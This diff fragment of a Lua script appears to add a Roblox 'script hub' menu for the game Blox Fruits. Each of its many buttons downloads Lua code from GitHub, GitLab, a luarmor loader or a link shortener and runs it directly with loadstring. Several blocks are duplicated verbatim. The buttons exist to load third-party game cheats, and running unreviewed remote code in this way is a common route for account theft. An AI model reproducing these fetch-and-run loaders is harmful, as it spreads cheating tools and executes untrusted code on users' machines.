+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Script-Blox/Script/main/PayBack.lua"))()
+        executednotify("Payback Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "RIPPER Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
+        executednotify("RIPPER Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "KAY Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/AXCScript/KayMobile/main/Script-Loader"))()
+        executednotify("KAY Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "THUNDER Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/RemakeMobileTest"))()
+        executednotify("THUNDER Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "SEAGATE Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/SeaBabyBF/seamain/main/SeaGateNextGenz"))()
+        executednotify("SEAGATE Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "MATSUNE Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
+        executednotify("MATSUNE Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "MIN SEAGATE Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
+        executednotify("MIN SEAGATE Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "ZINER Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
+        executednotify("ZINER Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "MUXUS Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
+        executednotify("MUXUS Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "MIN GREEN Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Basicallyybeta/main/main/Mingaming.lua"))()
+        executednotify("MIN GREEN Hub")
+   end,
+})
+BloxFruits:CreateButton({
+   Name = "AnDepZai Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/AnDepZaiHub/AnDepZaiHubBeta/main/AnDepZaiHubBeta.lua"))()
+        executednotify("AnDepZai Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Cokka Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/UserDevEthical/Loadstring/main/CokkaHub.lua"))()
+        executednotify("Cokka Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Delta Script",
+   Callback = function()
+        loadstring(getHttpRequest("https://gitlab.com/littlekiller2927/deltacore/-/raw/main/deltabf.lua"))()
+        executednotify("Delta Script")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Sara Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/SaraSenpai/bloxfruist/main/Sarahub"))()
+        executednotify("Sara Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Winter Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Yuri/main/Winterhub_V2.lua"))()
+        executednotify("Winter Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Uranium Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Augustzyzx/UraniumMobile/main/UraniumKak.lua"))()
+        executednotify("Uranium Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Azure Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
+        executednotify("Azure Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Vector Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tuxoz/VectorHub/main/BloxFruitPC%26MOBILE"))()
+        executednotify("Vector Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Royx Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/NightsTimeZ/Donate-Me/main/free%20bf.lua"))()
+        executednotify("Royx Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Wolf Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
+        executednotify("Wolf Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "Payback Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Script-Blox/Script/main/PayBack.lua"))()
+        executednotify("Payback Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "RIPPER Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
+        executednotify("RIPPER Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "KAY Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/AXCScript/KayMobile/main/Script-Loader"))()
+        executednotify("KAY Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "THUNDER Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/RemakeMobileTest"))()
+        executednotify("THUNDER Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "SEAGATE Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/SeaBabyBF/seamain/main/SeaGateNextGenz"))()
+        executednotify("SEAGATE Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "MATSUNE Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
+        executednotify("MATSUNE Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "MIN SEAGATE Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
+        executednotify("MIN SEAGATE Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "ZINER Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
+        executednotify("ZINER Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "MUXUS Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
+        executednotify("MUXUS Hub")
+   end,
+})
+
+BloxFruits:CreateButton({
+   Name = "MIN GREEN Hub",
+   Callback = function()
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/Basicallyybeta/main/main/Mingaming.lua"))()
+        executednotify("MIN GREEN Hub")
+   end,
 })
